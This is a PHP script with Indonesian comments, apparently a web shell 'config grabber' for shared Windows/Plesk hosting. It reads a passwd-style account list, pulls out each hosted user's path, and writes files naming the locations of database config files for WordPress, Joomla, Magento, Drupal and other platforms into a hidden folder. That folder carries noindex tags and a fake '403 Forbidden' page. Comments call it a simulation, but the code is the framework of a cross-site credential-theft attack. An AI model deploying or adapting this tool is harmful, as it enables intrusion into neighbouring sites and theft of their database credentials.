<?php 
function randomName($length = 8) {
    return 'vhost_' . substr(md5(uniqid(mt_rand(), true)), 0, $length);
}

$folder = randomName();

if ($_POST['trigger']) {
    @mkdir($folder, 0777);
    @chdir($folder);

    // Buat file index.htm dengan meta noindex,nofollow
    $html = "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='robots' content='noindex,nofollow'>
    <title>403 Forbidden</title>
</head>
<body>
    <h1>Access Denied</h1>
</body>
</html>";
    @file_put_contents("index.htm", $html);

    // Buat .htaccess (kalau IIS, sebenarnya ini gak dipakai, tapi tetap dibuat)
    $htaccess = "
Options -Indexes
DirectoryIndex index.htm";
    @file_put_contents(".htaccess", $htaccess);

    $etcp = $_POST['passwd'];
    $etcp = explode("\n", $etcp);

    foreach ($etcp as $line) {
        $parts = explode(":", $line);
        $userPath = $parts[5] ?? '';
        $cleanName = preg_replace('/C:\\\\Inetpub\\\\vhosts\\\\/i', '', $userPath);

        if (stripos($userPath, "C:\\Inetpub\\vhosts\\") !== false) {
            // Simulasikan symlink dengan mencatat path penting
            @file_put_contents("{$cleanName}-Wordpress.txt", $userPath . "\\httpdocs\\wp-config.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Joomla.txt", $userPath . "\\httpdocs\\configuration.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Lokomedia.txt", $userPath . "\\httpdocs\\config\\koneksi.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-phpBB.txt", $userPath . "\\httpdocs\\forum\\config.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Drupal.txt", $userPath . "\\httpdocs\\sites\\default\\settings.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-PrestaShop.txt", $userPath . "\\httpdocs\\config\\settings.inc.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Magento.txt", $userPath . "\\httpdocs\\app\\etc\\local.xml\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-OpenCart.txt", $userPath . "\\httpdocs\\admin\\config.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Ellislab.txt", $userPath . "\\httpdocs\\application\\config\\database.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-Parallels.txt", $userPath . "\\httpdocs\\inc\\connect.php\n", FILE_APPEND);
            @file_put_contents("{$cleanName}-MyBB.txt", $userPath . "\\httpdocs\\inc\\config.php\n", FILE_APPEND);
        }
    }

    echo "<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='robots' content='noindex,nofollow'>
<title>Config Output</title>
</head>
<body>
<center>
<a href='{$folder}/'><u>View Config Files</u></a>
</center>
</body>
</html>";
} else {
    echo "<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='robots' content='noindex,nofollow'>
<title>Access Panel</title>
</head>
<body>
<center>
<form method='POST' action=''>
<textarea name='passwd' rows='15' cols='60'>";
    echo @file_get_contents("C:\\Windows\\System32\\drivers\\etc\\passwd"); // Ganti sesuai lokasi simulasinya
    echo "</textarea><br><br>
<input type='submit' name='trigger' value='Submit'>
</form>
</center>
</body>
</html>";
}
?>
